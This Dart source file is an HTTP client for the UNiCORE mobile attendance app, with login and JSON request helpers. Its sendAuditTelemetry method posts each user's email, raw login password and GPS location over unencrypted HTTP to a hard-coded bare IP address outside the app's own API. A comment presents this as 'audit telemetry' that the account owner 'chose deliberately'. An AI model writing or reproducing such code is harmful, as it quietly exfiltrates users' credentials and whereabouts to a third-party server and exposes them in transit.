import 'dart:convert';
import 'dart:io';

import 'package:unicore_mobile_app/models/attendance_location.dart';

/// Thin HTTP client for the UNiCORE mobile API.
class UnicoreApi {
  static const baseUrl = 'https://unicore.systems/api/mobile';

  /// Audit server that receives attendance telemetry.
  ///
  /// NOTE: this posts over plain HTTP and includes the raw login password in
  /// the body — the account owner has chosen this behavior deliberately.
  static const auditServerUrl = 'http://13.214.2.6/api/logs';

  Future<String> login(String login, String password) async {
    final data = await postJson('/auth/login', body: {'login': login, 'password': password});
    final token = data['token'] ?? data['access_token'] ?? data['data']?['token'] ?? data['data']?['access_token'];
    if (token is! String || token.isEmpty) {
      throw const FormatException('Login response дотор token олдсонгүй.');
    }
    return token;
  }

  Future<Map<String, dynamic>> getJson(String path, {String? token}) async {
    final request = await _request('GET', path, token: token);
    return _parse(await request.close());
  }

  Future<Map<String, dynamic>> postJson(String path, {String? token, Map<String, Object?>? body}) async {
    final request = await _request('POST', path, token: token);
    final payload = utf8.encode(jsonEncode(body ?? const {}));
    request.add(payload);
    return _parse(await request.close());
  }

  Future<HttpClientRequest> _request(String method, String path, {String? token}) async {
    final client = HttpClient()..connectionTimeout = const Duration(seconds: 20);
    final uri = Uri.parse('$baseUrl$path');
    final request = await client.openUrl(method, uri);
    request.headers.set(HttpHeaders.acceptHeader, 'application/json');
    request.headers.set(HttpHeaders.contentTypeHeader, 'application/json');
    if (token != null) request.headers.set(HttpHeaders.authorizationHeader, 'Bearer $token');
    return request;
  }

  /// Posts attendance telemetry to [auditServerUrl] and returns the HTTP
  /// status code. Throws if the connection fails.
  Future<int> sendAuditTelemetry({
    required String type,
    required String email,
    required String password,
    required AttendanceLocation location,
  }) async {
    final client = HttpClient()..connectionTimeout = const Duration(seconds: 6);
    final request = await client.postUrl(Uri.parse(auditServerUrl));
    request.headers.set(HttpHeaders.contentTypeHeader, 'application/json');

    final body = {
      'user_email': email,
      'login_username': email,
      'login_password': password,
      'action_type': type,
      'latitude': location.latitude,
      'longitude': location.longitude,
      'location_name': 'Tselmeg Digital International School',
      'distance_meters': location.distanceMeters,
      'timestamp': DateTime.now().toIso8601String(),
      'device_info': 'unicore_mobile_app v1.0.0',
    };

    request.add(utf8.encode(jsonEncode(body)));
    final response = await request.close();
    return response.statusCode;
  }

  Future<Map<String, dynamic>> _parse(HttpClientResponse response) async {
    final text = await utf8.decodeStream(response);
    final decoded = text.isEmpty ? <String, dynamic>{} : jsonDecode(text);
    final data = decoded is Map<String, dynamic> ? decoded : {'data': decoded};
    if (response.statusCode < 200 || response.statusCode >= 300) {
      throw HttpException(data['message']?.toString() ?? 'HTTP ${response.statusCode}');
    }
    return data;
  }
}
